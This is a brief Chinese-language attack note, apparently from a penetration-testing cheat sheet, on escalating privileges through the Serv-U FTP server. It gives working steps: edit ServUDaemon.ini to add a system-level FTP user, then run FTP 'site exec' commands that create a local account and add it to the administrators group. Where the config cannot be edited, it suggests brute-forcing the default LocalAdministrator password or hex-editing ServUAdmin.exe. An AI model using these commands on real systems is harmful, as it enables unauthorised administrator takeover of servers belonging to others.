#### 有修改权限
1. 修改server-u默认安装目录下的ServUDaemon.ini配置文件，添加administrator/system权限的ftp用户
2. ftp远程连接该用户：
```shell
ftp http://www.xxx.com
```
3. 执行命令
```ftp
 quote site exec net user test test /add
 quote site exec net localgroup administrators test /add
```

#### 无修改权限
方法1：暴力破解server-u管理员密码（默认账号为：LocalAdministrator） 

方法2：十六进制打开ServUAdmin.exe文件（Server-u的管理程序）
利用server-u创建用户，提升权限
